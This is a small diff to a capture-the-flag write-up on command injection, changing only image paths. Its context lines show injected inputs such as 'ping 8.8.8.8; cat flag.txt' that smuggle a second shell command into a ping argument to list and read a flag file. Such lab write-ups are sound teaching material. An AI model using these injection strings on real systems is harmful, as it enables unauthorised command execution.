@@ -49,7 +49,7 @@ This executes:
 ping 8.8.8.8; ls
 ```
 ### Getting the flag
-![Getting the flag](Images/getting_flag.png)
+![Getting the flag](Images/Getting_the_flag.png)
 ### 📂 Output reveals:
 ```bash
 flag.txt
@@ -63,7 +63,7 @@ This executes:
 ping 8.8.8.8; cat flag.txt
 ```
 ### Flag
-![Flag](IMages/Flag.png)
+![Flag](Images/Flag.png)
 ### 🏁 Flag Captured
 
 Successfully retrieved the flag using command injection.
